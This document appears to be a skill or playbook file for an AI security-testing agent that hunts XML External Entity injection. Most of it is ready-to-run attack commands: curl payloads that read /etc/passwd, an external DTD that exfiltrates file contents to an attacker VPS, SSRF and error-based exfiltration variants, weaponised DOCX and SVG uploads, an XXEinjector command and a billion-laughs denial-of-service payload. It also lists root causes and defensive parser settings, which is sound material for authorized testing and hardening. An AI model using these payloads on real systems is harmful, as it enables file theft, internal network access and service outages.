---
name: hunt-xxe
description: >
  Hunt for XML External Entity injection: classic (in-band file/data disclosure), blind
  (out-of-band exfil via external DTD), and parameter entity techniques (error-based exfil,
  OOB when direct entity reflection is blocked). Use when the app accepts/parses XML — SOAP
  APIs, file uploads (DOCX/XLSX/SVG/XML config imports), SAML responses, RSS/Atom feed
  parsers, XML-RPC endpoints.
  Keywords: xxe, xml external entity, DOCTYPE, SYSTEM entity, billion laughs, XML bomb,
  SOAP injection, SVG XXE, DOCX XXE, SAML XXE, parameter entity OOB exfil.
  Do NOT use for plain JSON APIs with no XML parsing anywhere in the stack. Do NOT use for
  SSRF via non-XML vectors — use hunt-ssrf (though blind XXE is itself an SSRF delivery
  mechanism — document under both when the vector is XML-based).
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-611]
  mitre_attack: [T1190]
  tools: [curl, burp, xxeinjector, interactsh]
depends_on: [active-recon, web-crawling, param-discovery]
feeds_into: [chain-analysis, ssrf, info-disclosure]
chains_with: [ssrf, info-disclosure, lfi-rfi]
---

## Signals

- Endpoints with `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
- File upload features accepting any XML-based format: DOCX/XLSX/PPTX (zipped XML), SVG, XML
  config/import files, GPX, RSS/OPML import.
- SAML SSO flows — the SAML response/request is XML and frequently parsed with permissive
  settings.
- Any endpoint accepting raw XML in the body even if the primary API is JSON-based (some
  frameworks auto-detect content-type and parse both).
- Error messages revealing the underlying XML parser (`libxml`, `Xerces`, `SAXParseException`,
  `DOMDocument`) — a strong hint external entity resolution might be enabled.

## Prerequisites

- An endpoint confirmed to parse XML (via the signals above, or by sending well-formed XML and
  getting a parse-success response different from malformed XML).
- An OOB listener (your VPS or Interactsh) for blind XXE confirmation and data exfiltration via
  external DTD.
- A reachable test file path for classic in-band proof (`/etc/passwd` on Linux targets, or
  `C:\Windows\win.ini` on Windows) — pick the one appropriate to the target OS.

## Methodology

1. **Baseline well-formed XML** to confirm the endpoint actually parses XML (vs. just ignoring
   it):
   ```bash
   curl -s -X POST https://target/api/import -H "Content-Type: application/xml" \
     --data '<?xml version="1.0"?><root><name>test</name></root>'
   ```

2. **Classic in-band XXE — direct file read via internal subset DOCTYPE:**
   ```bash
   curl -s -X POST https://target/api/import -H "Content-Type: application/xml" --data '
   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root><name>&xxe;</name></root>'
   ```
   If the response reflects file content back (directly or inside the parsed field), that's
   immediate, strong in-band proof.

3. **Blind XXE via out-of-band external DTD** when direct reflection doesn't work (parser
   resolves the entity but doesn't echo it back anywhere visible):
   ```bash
   # host this on your VPS as /evil.dtd:
   cat > evil.dtd << 'EOF'
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_VPS/leak?data=%file;'>">
   %eval;
   %exfil;
   EOF
   # serve it: python3 -m http.server 80 (on YOUR_VPS)

   curl -s -X POST https://target/api/import -H "Content-Type: application/xml" --data '
   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY % remote SYSTEM "http://YOUR_VPS/evil.dtd">
     %remote;
   ]>
   <root><name>test</name></root>'
   ```
   Watch your VPS access log for the `/leak?data=...` request — the query string carries the
   exfiltrated file content (URL-encoded, may need chunking for larger files since this uses
   parameter entities).

4. **SSRF-via-XXE check** (blind XXE as a network primitive, independent of file read):
   ```bash
   curl -s -X POST https://target/api/import -H "Content-Type: application/xml" --data '
   <?xml version="1.0"?>
   <!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://YOUR_VPS/xxe-ssrf-confirm"> ]>
   <root><name>&xxe;</name></root>'
   ```
   A hit on your listener confirms the parser makes outbound requests — cross-reference with
   hunt-ssrf for cloud metadata/internal network escalation from here.

5. **Error-based exfil** when OOB egress is blocked by network controls (data-in-error-message
   technique, no outbound connection needed):
   ```bash
   cat > evil2.dtd << 'EOF'
   <!ENTITY % file SYSTEM "file:///etc/passwd">
   <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
   %eval;
   %error;
   EOF
   ```
   Reference `evil2.dtd` the same way as step 3 — the parser throws an error containing the file
   path (and thus the file's first line/content) because the crafted nonexistent path includes
   the file data, surfaced in the XML parse error response.

6. **File-format-wrapped XXE** — DOCX/XLSX/SVG uploads. Unzip, inject, rezip:
   ```bash
   unzip -o template.docx -d docx_extracted
   # edit docx_extracted/word/document.xml, inject the DOCTYPE/entity payload from step 2/3
   cd docx_extracted && zip -r ../payload.docx . && cd ..
   curl -s -X POST https://target/upload -F "file=@payload.docx"
   ```
   SVG (often simpler, served directly):
   ```bash
   cat > xxe.svg << 'EOF'
   <?xml version="1.0" standalone="yes"?>
   <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <svg width="100" height="100" xmlns="http://www.w3.org/2000/svg">
     <text x="0" y="15">&xxe;</text>
   </svg>
   EOF
   curl -s -X POST https://target/upload/avatar -F "file=@xxe.svg;type=image/svg+xml"
   ```

7. **SAML-specific XXE** — intercept a real SAML response/request, inject the DOCTYPE into the
   decoded XML before it's base64/deflate-re-encoded and resubmitted. This needs the actual
   intercepted assertion as a base; document the exact encode/decode steps used (base64 +
   optionally deflate for HTTP-Redirect binding) since there's no generic one-liner.

8. **Automate sweep with XXEinjector** once a candidate endpoint/parameter is known:
   ```bash
   ruby XXEinjector.rb --host=YOUR_VPS --path=/api/import --file=request.txt \
     --httpmethod=POST --oob=http
   ```

9. **Denial-of-service variant (billion laughs)** — only with explicit operator approval given
   it's a resource-exhaustion attack, not a read primitive:
   ```xml
   <!DOCTYPE lolz [
     <!ENTITY lol "lol">
     <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
     <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
     <!-- continues exponentially -->
   ]>
   ```

## Tooling

- `curl` — the core manual technique for every variant above.
- `XXEinjector` — automates OOB-based blind XXE discovery and file exfiltration via chunked
  out-of-band requests.
- Interactsh/Burp Collaborator — blind/OOB confirmation listener.
- Burp Suite — intercepting and modifying SAML/SOAP XML bodies in transit.

## Root Causes

- XML parser configured with external entity resolution enabled (`DTDLoadExternal`,
  `resolveEntity` not disabled) instead of disabling DOCTYPE/external entities entirely
  (`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` in Java,
  `libxml_disable_entity_loader()` in PHP, `defusedxml` instead of stdlib `xml.etree` in Python).
- Third-party libraries (PDF/DOCX/SVG renderers) bundling their own XML parser with default
  (unsafe) entity resolution, independent of the main app's own parser config.
- SAML/SSO libraries that parse assertions before signature validation, letting an attacker
  inject XXE in an unsigned or not-yet-verified portion of the document.

## Validation Gate (minimum proof)

- **In-band:** actual file content (or a recognizable fragment, e.g. `root:x:0:0:` from
  `/etc/passwd`) returned in the HTTP response.
- **Blind/OOB:** a verified inbound request on your listener carrying exfiltrated data in the
  query string/path, correlated to the specific payload and timestamp.
- **Error-based:** the file content (or a fragment) appearing inside a parser error message.
- Document the exact DOCTYPE/entity payload and content-type/endpoint used — XXE proof is very
  payload-specific and must be reproducible verbatim.

## Gotchas

- **Minimum proof, not a full filesystem crawl.** `/etc/passwd` or one config file is sufficient
  proof; don't loop through sensitive paths hunting for credentials beyond what's needed to
  demonstrate impact, and never target production data files without an explicit broader gate.
- **Common N/A:** parser returns a generic "DOCTYPE not allowed" or similar hard rejection —
  that's the control working (entity expansion disabled); don't report XXE just because XML is
  accepted, if DOCTYPE itself is rejected outright.
- **Common N/A:** classic in-band entity substitution blocked, but you never tried the OOB
  parameter-entity technique — a surprising number of apps block direct entity reflection in the
  response but still happily resolve external DTDs; always attempt step 3 before concluding
  not-vulnerable.
- **Overclaim trap:** a slow response to an XXE payload isn't proof on its own — pair with an
  actual OOB hit or in-band data before calling it Demonstrated rather than Unproven.
- File-format-wrapped payloads (DOCX/SVG) often get *re-saved* by the server (stripping the
  injected XML) before parsing — if upload succeeds but no XXE fires, check whether the server
  normalizes/sanitizes the file first; this is a mitigating factor to document, not silently
  drop as "not vulnerable."

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Local file read** — Can you read /etc/passwd or the Windows equivalent via an external entity?
2. **SSRF via entity** — Can you trigger SSRF by pointing an external entity at an internal URL?
3. **OOB exfiltration** — When in-band extraction fails, can you exfiltrate data out-of-band (error-based, or FTP/HTTP collaborator)?
4. **Parameter entity support** — Does the parser support parameter entities? Needed for OOB exfiltration of multi-line files.

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- XXE → **ssrf** (external entity as a network-request primitive — reaches internal services/
  cloud metadata the same as any SSRF).
- XXE → **info-disclosure** (config files, source code, credentials stored in flat files on the
  server read via `file://`).
- XXE → **lfi-rfi** overlap when the same `file://`/wrapper primitive is reachable through a
  non-XML path too — cross-reference findings rather than duplicating.
- Billion-laughs/DoS variant → availability-impact finding, kept separate from the data-exfil
  chain above and gated on explicit operator approval before firing.
